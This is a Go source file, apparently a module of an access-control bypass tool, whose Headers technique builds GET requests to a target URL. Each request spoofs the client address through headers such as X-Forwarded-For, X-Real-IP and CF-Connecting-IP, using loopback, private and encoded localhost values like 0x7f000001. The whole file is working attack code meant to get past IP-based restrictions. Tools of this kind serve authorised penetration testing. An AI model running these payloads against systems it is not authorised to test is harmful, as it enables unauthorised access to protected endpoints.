package techniques

func (Headers) Name() string { return "headers" }

type Headers struct{}

func (Headers) Generate(ctx Context) []Payload {
    ips := []string{
        ctx.BypassIP, "127.0.0.1", "localhost", "127.0.0.1:80",
        "::1", "10.0.0.1", "172.16.0.1", "192.168.1.1",
        "2130706433", "0x7f000001", "017700000001",
    }
    headers := []string{
        "X-Forwarded-For", "X-Real-IP", "X-Client-IP",
        "X-Originating-IP", "True-Client-IP", "Client-IP",
        "Cluster-Client-IP", "X-Cluster-Client-IP", "Forwarded",
        "X-Forwarded", "X-Forwarded-Host", "X-Host",
        "X-Custom-IP-Authorization", "X-ProxyUser-Ip",
        "CF-Connecting-IP", "Fastly-Client-IP",
        "X-Forwarded-Server", "X-Backend-Server",
    }
    var out []Payload
    for _, h := range headers {
        for _, ip := range ips {
            out = append(out, Payload{
                Method:      "GET",
                URL:         ctx.Target,
                Description: h + ": " + ip,
                Detail:      h + ": " + ip,
                Headers:     map[string]string{h: ip},
                Technique:   "headers",
            })
        }
    }
    return out
}